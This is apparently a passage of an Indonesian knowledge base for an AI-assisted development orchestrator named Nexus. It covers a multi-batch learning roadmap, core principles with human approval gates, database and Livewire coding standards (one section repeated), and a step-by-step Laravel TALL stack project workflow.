  *Mitigasi*: Tetap mempertahankan `TDDGuard` dan eksekusi `php artisan test` / `artisan serve` untuk memaksa AI memperbaiki *error*-nya sendiri jika terdeteksi gagal pada Fase Verifikasi.

---
*Apakah rencana di atas sudah sesuai dengan arah pengembangan TALL Pipeline Anda? Beri tahu saya jika kita bisa mulai mengeksekusi Phase 1!*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, tdd, saas]

### 📘 KNOWLEDGE: NEXUS_VISION_1000_PROJECT.MD

# 🌌 NEXUS VISION: 1000 PROJECT EVOLUTION
> **VERSION**: v1 | **Last Updated**: 26/05/2026



> **Status**: Visi Jangka Panjang  
> **Prasyarat**: Nexus berjalan di dalam Docker  
> **Filosofi**: Setiap 100 project adalah satu "era" — Nexus tidak hanya membangun web app, ia membangun dirinya sendiri.

---

## 🎯 Prinsip Utama

> *"Bukan tentang seberapa banyak project yang selesai. Tapi tentang seberapa dalam Nexus memahami setiap cara manusia membangun web."*

Setiap batch adalah **kurikulum hidup** — 100 project dikerjakan dengan satu stack, satu filosofi, satu cara berpikir. Hasilnya bukan hanya web app yang jalan, tapi **wisdom** yang di-harvest ke Golden HUB dan menjadi bagian permanen dari kecerdasan Nexus.

---

## 🐳 Mengapa Docker adalah Kuncinya

Tanpa Docker, roadmap ini mustahil:

```
Tanpa Docker:                    Dengan Docker:
──────────────────               ──────────────────────────────
PHP vs Python konflik      →     Setiap sandbox = container
RAM habis bersamaan        →     Spin up → selesai → destroy
Install/uninstall manual   →     Image siap pakai per batch
Environment tidak konsisten →    Reprodusibel di mesin apapun
```

Nexus di Docker = **Nexus yang bebas bereksperimen tanpa merusak sistem induk.**

---

## 📚 Roadmap 10 Batch × 100 Project

---

### 🟢 BATCH 1 — Era Fondasi
**Stack: PHP Native + Vanilla JS**  
**Filosofi: "Pahami web dari nol — tanpa magic, tanpa abstraksi"**

Nexus belajar bagaimana HTTP benar-benar bekerja. Setiap router ditulis tangan. Setiap query ditulis dengan PDO murni. Setiap DOM dimanipulasi tanpa library.

**Yang dikuasai:**
- HTTP request/response lifecycle murni
- SQL via PDO prepared statements
- DOM manipulation & event delegation
- Routing manual tanpa framework
- SQLite sebagai database ringan

**Wisdom yang di-harvest:**
- Pola keamanan dasar (XSS, SQL injection)
- Struktur MVC tanpa framework
- REST API dari nol

---

### 🔵 BATCH 2 — Era Framework PHP
**Stack: TALL Stack (Tailwind + Alpine + Laravel + Livewire)**  
**Filosofi: "Pahami mengapa framework diciptakan — karena batch 1 sudah dikuasai"**

Nexus kini tahu apa yang dilakukan Laravel "di balik layar" — karena sudah pernah menulisnya sendiri di batch 1. Framework bukan magic lagi, tapi **produktivitas yang terstruktur.**

**Yang dikuasai:**
- Eloquent ORM & migration system
- Livewire reactive components
- Alpine.js untuk UI interaktif ringan
- Artisan CLI automation
- Blade templating system

**Wisdom yang di-harvest:**
- Pola component-based UI
- Reactive state management
- Convention over configuration

---

### 🟡 BATCH 3 — Era JavaScript Server
**Stack: Node.js + Express + Vanilla JS**  
**Filosofi: "Satu bahasa, dua dunia — frontend dan backend bersatu"**

Nexus mengeksplorasi dunia async. Non-blocking I/O. Event loop. Dunia di mana PHP dan Node berpikir sangat berbeda tentang cara menangani request.

**Yang dikuasai:**
- Async/await & Promise chain
- Express middleware pattern
- REST API dengan JS murni
- npm ecosystem management
- Event-driven architecture dasar

**Wisdom yang di-harvest:**
- Pola async yang aman
- Middleware pipeline design
- Perbedaan paradigma PHP vs Node

---

### 🟠 BATCH 4 — Era Modern Frontend
**Stack: Laravel API + React**  
**Filosofi: "Frontend adalah aplikasi tersendiri — bukan sekedar tampilan"**

Nexus memisahkan backend dan frontend sepenuhnya. Backend hanya bicara JSON. Frontend adalah SPA yang hidup sendiri. Nexus belajar **kontrak API** sebagai bahasa komunikasi antar dua dunia.

**Yang dikuasai:**
- React component & hooks
- State management (Context/Zustand)
- API contract design
- SPA routing (React Router)
- CORS & authentication token

**Wisdom yang di-harvest:**
- Decoupled architecture pattern
- Frontend state yang skalabel
- API versioning strategy

---

### 🔴 BATCH 5 — Era Python Web
**Stack: Django + React**  
**Filosofi: "Bahasa yang lahir dari ilmu data — web sebagai antarmuka AI"**

Nexus memasuki ekosistem Python. Django membawa filosofi berbeda — batteries included, admin panel gratis, ORM yang ekspresif. Dan Python adalah pintu menuju dunia AI/ML.

**Yang dikuasai:**
- Django ORM & migrations
- Django REST Framework
- Python ekosistem (pip, venv)
- Admin panel customization
- Integrasi dasar dengan library AI

**Wisdom yang di-harvest:**
- Python-first architecture
- Stack yang siap AI-integration
- Perbedaan filosofi PHP vs Python

---

### 🟣 BATCH 6 — Era TypeScript Fullstack
**Stack: Next.js (Fullstack)**  
**Filosofi: "Type safety adalah dokumentasi yang hidup"**

Nexus menulis kode yang "berbicara" tentang dirinya sendiri melalui type system. Next.js menyatukan frontend dan backend dalam satu codebase dengan App Router dan Server Components.

**Yang dikuasai:**
- TypeScript type system
- SSR, SSG, ISR rendering modes
- Next.js App Router
- Server Components vs Client Components
- Edge functions & middleware

**Wisdom yang di-harvest:**
- Hybrid rendering strategy
- Type-driven development
- SEO-first architecture

---

### ⚫ BATCH 7 — Era High Performance
**Stack: Go + React**  
**Filosofi: "Ketika kecepatan adalah fitur — bukan bonus"**

Nexus keluar dari zona nyaman PHP/JS dan masuk ke dunia compiled language. Go mengajarkan concurrency yang sesungguhnya — goroutines, channels, dan binary yang berdiri sendiri tanpa runtime.

**Yang dikuasai:**
- Go syntax & type system
- Goroutines & channels
- HTTP server tanpa framework
- Binary deployment (single file)
- High-concurrency pattern

**Wisdom yang di-harvest:**
- Kapan PHP/Node tidak cukup
- Concurrency vs parallelism
- Zero-dependency deployment

---

### 🌊 BATCH 8 — Era Real-time
**Stack: Node.js + WebSocket + React**  
**Filosofi: "Web bukan lagi request-response — web adalah percakapan yang hidup"**

Nexus membangun aplikasi yang bernafas secara real-time. Chat, live dashboard, collaborative tools. State tidak lagi diam menunggu request — ia bergerak sendiri.

**Yang dikuasai:**
- WebSocket protocol
- Pub/sub pattern
- Real-time state sync
- Room & broadcast management
- Optimistic UI updates

**Wisdom yang di-harvest:**
- Event-driven UI architecture
- Connection state management
- Scale real-time connections

---

### 📱 BATCH 9 — Era Multi-Platform
**Stack: Laravel API + React Native / Flutter**  
**Filosofi: "Satu backend, tak terbatas platform"**

Nexus membangun API yang tidak hanya melayani browser — tapi juga mobile. Backend dirancang platform-agnostic. Nexus belajar bahwa API yang baik adalah API yang tidak peduli siapa yang memanggilnya.

**Yang dikuasai:**
- Mobile API design pattern
- JWT & OAuth authentication
- Push notification system
- Offline-first strategy
- React Native / Flutter dasar

**Wisdom yang di-harvest:**
- Platform-agnostic API design
- Mobile-first security
- Cross-platform state sync

---

### 🤖 BATCH 10 — Era AI-Integrated
**Stack: FastAPI (Python) + React + LLM API**  
**Filosofi: "Web app yang bisa berpikir — AI bukan fitur tambahan, tapi inti aplikasi"**

Batch terakhir adalah kulminasi semua yang dipelajari. Nexus membangun web app yang mengintegrasikan LLM, vector database, dan semantic search. Ini adalah stack di mana Nexus membangun aplikasi yang mirip dengan dirinya sendiri.

**Yang dikuasai:**
- FastAPI async backend
- Vector DB (ChromaDB/pgvector)
- RAG (Retrieval Augmented Generation)
- Streaming LLM response
- Semantic search integration

**Wisdom yang di-harvest:**
- AI-first architecture
- Prompt engineering dalam production
- LLM integration pattern

---

## 📊 Peta Evolusi Nexus

```
Batch 1  ──► Nexus tahu cara kerja web
Batch 2  ──► Nexus tahu cara framework bekerja
Batch 3  ──► Nexus tahu paradigma async
Batch 4  ──► Nexus tahu decoupled architecture
Batch 5  ──► Nexus tahu ekosistem Python
Batch 6  ──► Nexus tahu type-safe development
Batch 7  ──► Nexus tahu high-performance systems
Batch 8  ──► Nexus tahu real-time systems
Batch 9  ──► Nexus tahu multi-platform design
Batch 10 ──► Nexus tahu cara membangun AI apps
             │
             ▼
        Nexus project ke-1001:
        Membangun versi dirinya sendiri
        yang lebih baik.
```

---

## 🧠 Yang Nexus Miliki Setelah 1000 Project

| Kategori | Yang Dimiliki |
|---|---|
| **Golden HUB** | 1000+ wisdom entries lintas stack |
| **Skill Library** | Pattern untuk setiap skenario umum |
| **Error Database** | Setiap bug yang pernah ditemui + solusinya |
| **Architecture Patterns** | MVC, SPA, SSR, microservice, real-time, AI |
| **Security Patterns** | XSS, CSRF, SQL injection, JWT, OAuth |
| **Language Paradigms** | PHP, JS, TypeScript, Python, Go |

---

## ⚡ Kondisi yang Harus Terpenuhi

Roadmap ini baru bisa dimulai ketika:

- [ ] **Nexus berjalan di Docker** — isolasi penuh, RAM terkontrol
- [ ] **Batch 1 menghasilkan web app 100% functional** — fondasi harus solid
- [ ] **Harvest pipeline sempurna** — tidak ada wisdom yang terbuang
- [ ] **EvolutionPiper.js stabil** — loop 100 project berjalan tanpa intervention
- [ ] **Self-healing rate > 90%** — Nexus bisa debug sendiri tanpa bantuan

---

## 🔮 Visi Akhir

> Setelah 1000 project, Nexus bukan lagi tools — ia adalah **institutional knowledge** yang hidup. Setiap developer yang bekerja dengannya mendapat manfaat dari 1000 project yang pernah dikerjakan sebelumnya.
>
> Project ke-1001 bukan web app biasa — melainkan **Nexus generasi berikutnya**, dibangun oleh Nexus generasi sekarang, menggunakan semua yang telah dipelajari.

---

*Generated by Nexus Vision Document | Versi 1.0.0 | Status: DRAFT*  
*Dibuat: 19 Mei 2026 | Prasyarat: Docker + Batch 1 100% functional*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, api]

### 📘 KNOWLEDGE: NEXUS_CORE_PRINCIPLES.MD

# 🛡️ NEXUS CORE PRINCIPLES (Distilled from Golden Standard)

Dokumen ini adalah kristalisasi dari nilai-nilai inti yang ditemukan dalam proyek tersukses (Golden Projects) di ekosistem Human-AI Nexus.

## 1. Documentation-First Architecture
Dokumentasi bukan sekadar catatan, melainkan **blueprint wajib**.
- **No Algorithm, No Code**: Dilarang menulis logika kompleks sebelum algoritma tertulis di folder `documentation/algorithms/`.
- **No Plan, No Execution**: Setiap tugas harus memiliki rencana kerja di folder `documentation/planning/`.

## 3. The Approval Protocol
- **Human Authority**: AI adalah pelaksana, Manusia adalah pemegang keputusan.
- **Explicit Approval**: Persetujuan ("OKE" / "APPROVE") wajib didapatkan sebelum modifikasi file fisik dilakukan.
- **Two-Stage Review**: Setiap perubahan harus melalui 2 tahap review:
    1. **Spec Compliance**: Apakah kode memenuhi persyaratan?
    2. **Code Quality**: Apakah kode rapi, efisien, dan sesuai standar Nexus?
- **Socratic Brainstorming**: Gunakan teknik tanya-jawab untuk memvalidasi desain sebelum masuk ke fase perencanaan.

## 3. Zero Flaws Enforcement
- Proyek belum dianggap selesai sebelum status audit menyatakan "Nol Cacat".
- Kualitas meliputi: Keamanan (Security), Performa (Performance), dan Pemeliharaan (Maintainability).

## 4. IP-First & Future Proofing
- Selalu gunakan UUID untuk identitas data.
- Pastikan data siap untuk dipetakan ke Web 3.0 / Smart Contract di masa depan.

## 5. User-Centric Evolution (Findability & Temporality)
- **Findability is Core**: Antarmuka harus sederhana, cepat, dan relevan. Kurangi clics, utamakan visual actionable.
- **Temporal UX Awareness**: Sadari bahwa kebutuhan user berubah dari **Orientation** (estetika) ke **Incorporation** (fungsionalitas).
- **Mobile-First Priority**: Desain harus responsif dan memprioritaskan pengalaman mobile sebagai standar utama.

---
*Status: Institutional Knowledge (Verified).*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, performance, ui-ux, database, tdd, nexus_institutionalized]

### 📘 KNOWLEDGE: NEXUS_DATABASE_STANDARDS.MD

# 💾 NEXUS DATABASE STANDARDS (Distilled from Golden Standard)

Standar ini wajib diikuti untuk memastikan integritas data dan kesiapan skalabilitas (Web 3.0 Ready).

## 1. Identity Management
- **UUID as Primary Key**: Gunakan `uuid()` untuk seluruh tabel utama.
- **Trait Implementation**: Gunakan `HasUuids` pada model Laravel untuk otomatisasi.
- **Benefit**: Menghindari kebocoran jumlah data melalui ID integer dan mempermudah migrasi ke sistem terdesentralisasi.

## 2. Mass Assignment Security
- **Explicit Fillable**: Seluruh kolom yang dapat diisi oleh user **WAJIB** didefinisikan dalam array `$fillable`.
- **Forbidden Guarded**: Penggunaan `$guarded = []` dilarang keras karena melanggar prinsip "Zero Flaws".

## 3. Relationship Architecture
- Gunakan Eloquent Relationship dengan definisi yang jelas (One-to-Many, Many-to-Many).
- Gunakan tabel pivot untuk relasi interaksi (like, bookmark, follow).

## 4. Indexing for Performance
- Setiap Foreign Key (`user_id`, `author_id`, dll) **WAJIB** memiliki index untuk kecepatan query.

---
*Status: Institutional Knowledge (Database Layer).*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, performance, ui-ux, database, nexus_institutionalized]

### 📘 KNOWLEDGE: NEXUS_INTEGRATION_ALGORITHM.MD

# 🛠 ALGORITMA INTEGRASI: Human-AI Nexus (Automated Engine Version)

Dokumen ini adalah **Sumber Kebenaran (Source of Truth)** untuk logika orkestrasi yang dijalankan oleh `NexusEngine`. Seluruh instruksi di sini diimplementasikan ke dalam kode program untuk memastikan konsistensi antara dokumentasi dan eksekusi.

## 📋 1. Setup & Inisialisasi

Sistem mengawali setiap siklus dengan fase **Intelligence Discovery**:
1.  **Skill Discovery**: Engine memetakan seluruh modul di folder `skill/` (Frontend, Backend, Security, dll).
2.  **Memory Access**: Engine membaca folder `records/` dan `knowledge/` untuk mendapatkan konteks dari sesi sebelumnya.

```bash
# Inisialisasi otomatis via Nexus Engine (GitHub Version)
npx github:Faisal-Trainer/Human-AI-Nexus nexus run
```

## 📋 2. Algoritma Audit (Dev-Centric Logic)

Fase audit adalah tahap penentu kualitas. Alur kerja ditentukan oleh tingkat pengalaman Developer (User):

### IF (Mode == "Learning")
- **Kondisi**: Developer baru atau membutuhkan edukasi teknis mendalam.
- **Tindakan**: 
    1. Orchestrator memanggil seluruh **Agent Spesialis** (Cyber Security, UX Engineer, SEO Specialist, Database Architect).
    2. Setiap Agent menghasilkan satu laporan mandiri di folder `audit/`.
- **Tujuan**: Memberikan transparansi penuh dan bahan pembelajaran dari tiap sudut pandang ahli.

### ELSE (Mode == "Efficient")
- **Kondisi**: Developer berpengalaman atau membutuhkan eksekusi cepat.
- **Tindakan**:
    1. Orchestrator memanggil **Project Manager (PM)**.
    2. PM melakukan scanning dan menulis satu laporan konsolidasi yang merangkum seluruh temuan utama.
- **Tujuan**: Efisiensi waktu dan fokus pada masalah strategis.

## 📋 3. Nexus Workflow (Siklus Otomatis)

Engine menjalankan siklus berikut secara rekursif:

1.  **Phase: Audit**: Menjalankan algoritma di atas (Learning/Efficient).
    - **Security Guardrail**: Engine meminta izin eksplisit sebelum menscan `.env`, `package.json`, dan `composer.json`.
2.  **Phase: Planning**: 
    - Input: Hasil audit terbaru (termasuk temuan keamanan jika diizinkan).
    - Action: PM menyusun dokumen di `planning/` berisi daftar tugas (TODO list).
3.  **Phase: Approval**:
    - Engine **WAJIB** berhenti dan menunggu input User (Ketik: "OKE" atau "APPROVE").
4.  **Phase: Execution**:
    - Agent Engineer mengeksekusi tugas sesuai rencana yang telah disetujui.
5.  **Phase: Recording**:
    - Mencatat hasil ke `records/` dan memperbarui memori di `knowledge/`.

## ⚠️ Aturan Emas (The Golden Rules)

1.  **Logic-First**: Kode program dilarang menyimpang dari algoritma yang tertulis di dokumen ini.
2.  **Zero Flaws Enforcement**: Siklus audit tidak boleh berhenti sebelum status proyek mencapai "Zero Flaws" sesuai [STANDAR_ZERO_FLAWS.md](STANDAR_ZERO_FLAWS.md).
3.  **Traceability**: Setiap file yang dihasilkan harus menyertakan referensi ke dokumen sumbernya (misal: Plan merujuk pada Audit ID tertentu).

---
*Dokumen ini mengatur bagaimana software dan manusia berkolaborasi dalam ekosistem Nexus.*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, ui-ux, database, vcs, marketing, psychology]

### 📘 KNOWLEDGE: NEXUS_LIVEWIRE_STANDARDS.MD

# ⚡ LIVEWIRE & ARCHITECTURE STANDARDS

Dokumen ini mencatat standar penulisan komponen Livewire di dalam ekosistem Nexus untuk memastikan kompatibilitas IDE dan performa maksimal.

---

## 1. Layout Definition
**Masalah**: Penggunaan method chaining `->layout('layouts.app')` pada fungsi `render()` sering menyebabkan *Undefined Method* linting error di beberapa IDE meskipun secara fungsional valid di Livewire 3.

**Standar Nexus**: Gunakan **PHP Attributes** di atas metode `render()` atau di atas deklarasi class untuk mendefinisikan layout.

```php
// ✅ BENAR (Gunakan Attribute)
use Livewire\Attributes\Layout;

#[Layout('layouts.app')]
public function render()
{
    return view('livewire.component');
}

// ❌ HINDARI (Dapat menyebabkan lint error)
public function render()
{
    return view('livewire.component')->layout('layouts.app');
}
```

---

## 2. Mass Assignment Protection
Seluruh model interaksi (Rating, Bookmark, Follow) **WAJIB** menggunakan `$fillable` secara eksplisit. Penggunaan `$guarded = []` sangat dilarang untuk menjaga integritas "Zero Flaws".

---

## 3. Media Protocol (WebP)
Setiap komponen yang menangani unggahan gambar harus menyertakan logic konversi ke **WebP** menggunakan `Intervention/Image` sebelum disimpan ke storage untuk efisiensi bandwidth.

---

## 4. UUID Consistency
Seluruh tabel database menggunakan `UUID` sebagai Primary Key. Jangan pernah menggunakan `id` (integer) untuk entitas yang terekspos ke publik atau entitas yang akan menjadi aset IP.

---
*Last Updated: 2026-04-28 by Nexus Orchestrator.*


--- APPENDED FROM LIVEWIRE_STANDARDS.md ---
# ⚡ LIVEWIRE & ARCHITECTURE STANDARDS

Dokumen ini mencatat standar penulisan komponen Livewire di dalam ekosistem Nexus untuk memastikan kompatibilitas IDE dan performa maksimal.

---

## 1. Layout Definition
**Masalah**: Penggunaan method chaining `->layout('layouts.app')` pada fungsi `render()` sering menyebabkan *Undefined Method* linting error di beberapa IDE meskipun secara fungsional valid di Livewire 3.

**Standar Nexus**: Gunakan **PHP Attributes** di atas metode `render()` atau di atas deklarasi class untuk mendefinisikan layout.

```php
// ✅ BENAR (Gunakan Attribute)
use Livewire\Attributes\Layout;

#[Layout('layouts.app')]
public function render()
{
    return view('livewire.component');
}

// ❌ HINDARI (Dapat menyebabkan lint error)
public function render()
{
    return view('livewire.component')->layout('layouts.app');
}
```

---

## 2. Mass Assignment Protection
Seluruh model interaksi (Rating, Bookmark, Follow) **WAJIB** menggunakan `$fillable` secara eksplisit. Penggunaan `$guarded = []` sangat dilarang untuk menjaga integritas "Zero Flaws".

---

## 3. Media Protocol (WebP)
Setiap komponen yang menangani unggahan gambar harus menyertakan logic konversi ke **WebP** menggunakan `Intervention/Image` sebelum disimpan ke storage untuk efisiensi bandwidth.

---

## 4. UUID Consistency
Seluruh tabel database menggunakan `UUID` sebagai Primary Key. Jangan pernah menggunakan `id` (integer) untuk entitas yang terekspos ke publik atau entitas yang akan menjadi aset IP.

---
*Last Updated: 2026-04-28 by Nexus Orchestrator.*


--- APPENDED FROM LIVEWIRE_STANDARDS.md ---
# ⚡ LIVEWIRE & ARCHITECTURE STANDARDS

Dokumen ini mencatat standar penulisan komponen Livewire di dalam ekosistem Nexus untuk memastikan kompatibilitas IDE dan performa maksimal.

---

## 1. Layout Definition
**Masalah**: Penggunaan method chaining `->layout('layouts.app')` pada fungsi `render()` sering menyebabkan *Undefined Method* linting error di beberapa IDE meskipun secara fungsional valid di Livewire 3.

**Standar Nexus**: Gunakan **PHP Attributes** di atas metode `render()` atau di atas deklarasi class untuk mendefinisikan layout.

```php
// ✅ BENAR (Gunakan Attribute)
use Livewire\Attributes\Layout;

#[Layout('layouts.app')]
public function render()
{
    return view('livewire.component');
}

// ❌ HINDARI (Dapat menyebabkan lint error)
public function render()
{
    return view('livewire.component')->layout('layouts.app');
}
```

---

## 2. Mass Assignment Protection
Seluruh model interaksi (Rating, Bookmark, Follow) **WAJIB** menggunakan `$fillable` secara eksplisit. Penggunaan `$guarded = []` sangat dilarang untuk menjaga integritas "Zero Flaws".

---

## 3. Media Protocol (WebP)
Setiap komponen yang menangani unggahan gambar harus menyertakan logic konversi ke **WebP** menggunakan `Intervention/Image` sebelum disimpan ke storage untuk efisiensi bandwidth.

---

## 4. UUID Consistency
Seluruh tabel database menggunakan `UUID` sebagai Primary Key. Jangan pernah menggunakan `id` (integer) untuk entitas yang terekspos ke publik atau entitas yang akan menjadi aset IP.

---
*Last Updated: 2026-04-28 by Nexus Orchestrator.*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, performance, ui-ux, database, nexus_institutionalized]

### 📘 KNOWLEDGE: NEXUS_STANDARD WORKFLOW PROJECT TES.MD

# Standard Workflow PBL TALL Stack
> **VERSION**: v2 | **Last Updated**: 26/05/2026



Workflow ini dirancang agar setiap project:

- memiliki struktur engineering yang konsisten,
- scalable,
- mudah direfactor,
- dan membangun habit developer level production.

---

# GLOBAL DEVELOPMENT FLOW

```text
Ide Project
    ↓
Problem Definition
    ↓
Requirement Breakdown
    ↓
Project Setup
    ↓
Install TALL Dependencies
    ↓
Database Design
    ↓
UI/UX Planning
    ↓
Feature Development
    ↓
Testing
    ↓
Refactor
    ↓
Optimization
    ↓
Deployment
    ↓
Documentation
    ↓
Portfolio Publish
```

---

# 1. PROJECT INITIALIZATION

## Create Laravel Project

```bash
composer create-project laravel/laravel project-name
```

atau:

```bash
laravel new project-name
```

---

## Masuk ke Project

```bash
cd project-name
```

---

# 2. INSTALL TALL STACK

# Install Tailwind CSS

## Install dependencies

```bash
npm install -D tailwindcss postcss autoprefixer
```

## Init Tailwind

```bash
npx tailwindcss init -p
```

---

## Configure tailwind.config.js

```js
content: [
    "./resources/**/*.blade.php",
    "./resources/**/*.js",
    "./resources/**/*.vue",
],
```

---

## Import Tailwind

### resources/css/app.css

```css
@tailwind base;
@tailwind components;
@tailwind utilities;
```

---

# Install Alpine.js

```bash
npm install alpinejs
```

---

## resources/js/app.js

```js
import Alpine from "alpinejs";

window.Alpine = Alpine;

Alpine.start();
```

---

# Install Livewire

## Livewire v3

```bash
composer require livewire/livewire
```

---

## Publish assets

```bash
php artisan livewire:publish --assets
```

---

# Install Additional Core Packages

## Laravel Debugbar

```bash
composer require barryvdh/laravel-debugbar --dev
```

---

## Laravel Pint

```bash
composer require laravel/pint --dev
```

---

## Laravel IDE Helper

```bash
composer require --dev barryvdh/laravel-ide-helper
```

---

## Spatie Permission

```bash
composer require spatie/laravel-permission
```

---

## Laravel Telescope (optional)

```bash
composer require laravel/telescope --dev
```

---

# Frontend Build

## Install NPM

```bash
npm install
```

---

## Run Vite

```bash
npm run dev
```

---

# 3. ENVIRONMENT SETUP

# Configure .env

## Database

```env
DB_DATABASE=project_db
DB_USERNAME=root
DB_PASSWORD=
```

---

## App URL

```env
APP_URL=http://localhost:8000
```

---

## Queue

```env
QUEUE_CONNECTION=database
```

---

## Cache

```env
CACHE_DRIVER=database
```

---

# Generate App Key

```bash
php artisan key:generate
```

---

# Run Migration

```bash
php artisan migrate
```

---

# 4. PROJECT ARCHITECTURE PLANNING

# Sebelum Coding

WAJIB buat:

## Feature List

Contoh:

```text
- Authentication
- Dashboard
- CRUD Task
- Realtime Notification
- Activity Log
```

---

## Database Schema

Contoh:

```text
users
tasks
task_comments
task_labels
notifications
```

---

## Relationship Mapping

Contoh:

```text
User
 └── hasMany Tasks

Task
 └── belongsTo User
 └── hasMany Comments
```

---

# 5. UI/UX PLANNING

# Wajib Sebelum Coding UI

## Tentukan:

- layout app
- navigation
- component reusable
- responsive behavior
- state interaction

---

# Recommended Structure

```text
resources/views/
    layouts/
    pages/
    components/
```

---

# Livewire Structure

```text
app/Livewire/
    Dashboard/
    Tasks/
    Users/
```

---

# 6. FEATURE DEVELOPMENT FLOW

# Standard Flow

```text
Migration
    ↓
Model
    ↓
Seeder
    ↓
Factory
    ↓
Policy
    ↓
Livewire Component
    ↓
Blade UI
    ↓
Testing
```

---

# Example Development

## Create Model + Migration

```bash
php artisan make:model Task -m
```

---

## Create Livewire Component

```bash
php artisan make:livewire Tasks/Index
```

---

## Create Policy

```bash
php artisan make:policy TaskPolicy --model=Task
```

---

## Create Seeder

```bash
php artisan make:seeder TaskSeeder
```

---

# 7. DEVELOPMENT RULES

# Rule 1 — Jangan Coding Tanpa Scope

Selalu definisikan:

- input
- output
- state
- edge case

---

# Rule 2 — Build MVP Dulu

Jangan:

- terlalu fokus UI
- premature optimization
- micro animation berlebihan

---

# Rule 3 — Refactor Berkala

Setelah feature selesai:

- pecah component
- optimize query
- reusable abstraction

---

# Rule 4 — Gunakan Service Layer

Untuk business logic besar:

```text
app/Services/
```

Contoh:

```text
TaskService.php
PaymentService.php
NotificationService.php
```

---

# 8. TESTING FLOW

# Minimal Testing

## Feature Test

```bash
php artisan make:test TaskTest
```

---

## Jalankan Test

```bash
php artisan test
```

---

# Yang Wajib Dites

- auth
- validation
- permission
- CRUD
- edge case

---

# 9. PERFORMANCE OPTIMIZATION

# Checklist

## Query Optimization

Gunakan:

```php
with()
load()
lazy()
```

---

## Cache

```php
Cache::remember()
```

---

## Queue

Untuk:

- email
- notification
- heavy process

---

## Pagination

```php
paginate()
```

---

## Debounce Input

```html
wire:model.live.debounce.500ms
```

---

# 10. SECURITY CHECKLIST

# Wajib

## Authorization

```php
Gate
Policy
```

---

## Validation

```php
$request->validate()
```

---

## Rate Limiting

```php
ThrottleRequests
```

---

## XSS Protection

Gunakan:

- escaped output
- sanitization

---

## CSRF Protection

Laravel sudah built-in.

---

# 11. REFACTOR PHASE

# Setelah MVP Selesai

## Evaluasi:

- duplicated code
- fat component
- long method
- N+1 query
- reusable UI

---

# Refactor Goal

Dari:

```text
messy app
```

menjadi:

```text
maintainable architecture
```

---

# 12. DEPLOYMENT FLOW

# Production Build

## Build assets

```bash
npm run build
```

---

## Optimize Laravel

```bash
php artisan optimize
```

---

## Queue Worker

```bash
php artisan queue:work
```

---

# Optional Deployment

- VPS
- Forge
- Ploi
- Docker
- Railway
- Laravel Cloud

---

# 13. DOCUMENTATION FLOW

# Wajib Ada

## README.md

Isi:

- project overview
- stack
- installation
- features
- screenshots

---

## Architecture Notes

Contoh:

```text
docs/[architecture.md](../ui-ux/NEXUS_ARCHITECTURE.MD)
```

---

## API Notes

Jika ada API:

```text
docs/api.md
```

---

## Database Diagram

Gunakan:

- dbdiagram.io
- drawSQL

---

# 14. POST PROJECT REVIEW

# Setelah Project Selesai

## Jawab:

### Technical

- bagian tersulit?
- bottleneck?
- scaling issue?

### Product

- UX problem?
- missing feature?
- usability issue?

### Engineering

- apakah code maintainable?
- apakah component reusable?
- apakah architecture scalable?

---

# 15. PORTFOLIO STRUCTURE

# Simpan Semua Project Dengan Struktur

```text
projects/
    01-todo-app
    02-habit-tracker
    03-kanban-board
```

---

# Setiap Project Harus Punya

```text
README.md
screenshots/
docs/
```

---

# GOLDEN RULE PBL

## Jangan Fokus:

- cepat selesai

## Fokus:

- problem solving
- architecture thinking
- maintainability
- scalability
- engineering habit

---

# TARGET OUTCOME

Jika workflow ini dilakukan terus-menerus, kamu akan berkembang dari:

```text
Coder
```

menjadi:

```text
Software Engineer
```

dan akhirnya:

```text
System Architect / SaaS Engineer
```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, saas, api]

